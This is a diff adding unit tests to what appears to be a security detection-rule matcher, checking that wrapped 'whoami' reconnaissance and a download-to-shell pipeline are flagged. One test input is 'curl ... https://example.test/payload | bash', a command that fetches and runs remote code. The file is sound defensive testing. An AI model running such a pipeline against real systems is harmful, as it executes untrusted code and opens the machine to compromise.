@@ -34,6 +34,28 @@ test('interpreted scripts and quoted audit arguments are checked without flaggin
     }
 })
 
+test('unwraps bounded command wrappers and normalizes Windows executable paths', () => {
+    const wrapped = { event_type: 'process', action: 'exec', process: {
+        executable: '/usr/bin/sudo',
+        arguments: ['sudo', '-u', 'root', 'env', '-i', 'bash', '-c', 'whoami'],
+    } }
+    expect(matchSecurityRules(wrapped)).toContainEqual(expect.objectContaining({ id: 'process.recon.whoami.v1' }))
+
+    const windowsExecutable = { event_type: 'process', action: 'exec', process: { executable: 'C:\\Windows\\System32\\whoami.exe' } }
+    expect(matchSecurityRules(windowsExecutable)).toContainEqual(expect.objectContaining({ id: 'process.recon.whoami.v1' }))
+})
+
+test('matches executed shell segments and requires a real download-to-shell pipeline', () => {
+    const event = (command: string) => ({ event_type: 'process', action: 'exec', process: {
+        executable: '/bin/bash', arguments: ['bash', '-c', command], command_line: `bash -c '${command}'`,
+    } })
+    expect(matchSecurityRules(event('echo ready; whoami'))).toContainEqual(expect.objectContaining({ id: 'process.recon.whoami.v1' }))
+    expect(matchSecurityRules(event('curl -fsS https://example.test/payload | bash')))
+        .toContainEqual(expect.objectContaining({ id: 'process.behavior.pipe_shell.v1' }))
+    expect(matchSecurityRules(event('curl -fsS https://example.test/health | cat')))
+        .not.toContainEqual(expect.objectContaining({ id: 'process.behavior.pipe_shell.v1' }))
+})
+
 const envEvent = (args: string[], structured = true) => ({ event_type: 'process', action: 'exec', process: {
     executable: '/usr/bin/env', ...(structured ? { arguments: ['env', ...args] } : {}),
     command_line: ['env', ...args].map(arg => /\s/.test(arg) ? `'${arg}'` : arg).join(' '),
